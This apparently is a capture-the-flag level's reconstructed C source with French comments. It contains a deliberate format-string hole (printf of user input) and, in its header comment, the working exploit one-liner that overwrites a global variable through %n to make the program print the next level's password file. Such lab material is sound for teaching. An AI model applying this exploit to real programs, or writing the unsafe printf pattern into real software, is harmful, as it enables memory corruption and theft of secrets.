/*
	Pour compiler le .c:
	gcc -m32 -fno-stack-protector source.c -o level4

	Ensuite:
	python -c 'print "\x48\xa0\x04\x08"+"%16930112d%10$n"' > /tmp/lvl4

	Pour finir:
	cat /tmp/lvl4 - | ./level4
*/
#include <stdio.h>
#include <stdlib.h>

static int	m = 0;			// Variable globale m

void	p(char *str)
{
	printf(str);			// Affichage de la chaine entrée dans fgets
	return ;
}

void	n(void)
{
	char	str[512];		// Définition du buffer

	fgets(str, 512, stdin);	// Saisie de caractères et de chaînes avec une taille définie
	p(str);					// Appel fonction p()
	if (m == 16930116)		// Comparaison entre la globale et 16930116
		system("/bin/cat /home/user/level5/.pass");	// Affichage .pass
	return ;
}

int 	main(void)
{
	n();					// Appel fonction n()
	return 0;
}